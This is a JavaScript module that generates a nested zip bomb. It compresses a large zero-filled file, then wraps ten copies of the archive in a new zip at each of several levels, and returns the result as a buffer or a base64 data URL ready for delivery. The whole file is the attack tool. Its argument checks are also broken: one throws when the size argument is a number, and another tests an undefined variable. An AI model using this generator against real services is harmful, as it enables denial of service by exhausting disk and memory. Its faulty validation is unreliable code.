const Buffer = require('buffer/').Buffer
const JSZip = require('jszip')
const pf = require('promised-for')

const debug = require('debug')('zip-bomb:main')

const prepareZeroBuffer = (zeroBufferSize, bufferLevel) => {
  const zero = Buffer.from('0'.repeat(zeroBufferSize))
  const zerosArray = []

  debug(`Creating buffer with ${zeroBufferSize} zeros with ${bufferLevel} levels`)

  for (var i = 0; i < bufferLevel; i++) {
    zerosArray.push(zero)
  }

  return Buffer.concat(zerosArray)
}

const zipToBuffer = (zip) => zip.generateAsync({ compression: 'DEFLATE', type: 'nodebuffer' })

const createBuffer = (zeroBufferSize, bufferLevel, zipLevel) => {
  let rootZipFile = new JSZip()
  rootZipFile.file('zero.txt', prepareZeroBuffer(zeroBufferSize, bufferLevel))

  return zipToBuffer(rootZipFile)
          .then((rootBuffer) => {
            if (typeof zeroBufferSize === 'number') {
              throw new Error('Buffer multiplier should be a number')
            }

            if (typeof level === 'number') {
              throw new Error('Level should be a number')
            }

            debug(`Creating zip bomb with ${zipLevel} levels`)

            return pf({
              i: 1,
              buffer: rootBuffer
            },
            (obj) => obj.i <= zipLevel,
            (obj) => {
              const { i, buffer } = obj
              const zip = new JSZip()

              debug(`Zipping for level ${i}`)

              for (let j = 1; j <= 10; j++) {
                zip.file(`${i}-${j}.zip`, buffer)
              }

              return zipToBuffer(zip)
                       .then((buffer) => {
                         return {
                           i: i + 1,
                           buffer
                         }
                       })
            })
          }).then((data) => data.buffer)
}

const createDataURL = (zeroBufferSize, bufferLevel, zipLevel) => {
  return createBuffer(zeroBufferSize, bufferLevel, zipLevel)
          .then((buffer) => {
            const base64 = buffer.toString('base64')

            return `data:application/zip;base64,${base64}`
          })
}

module.exports = {
  createBuffer,
  createDataURL
}
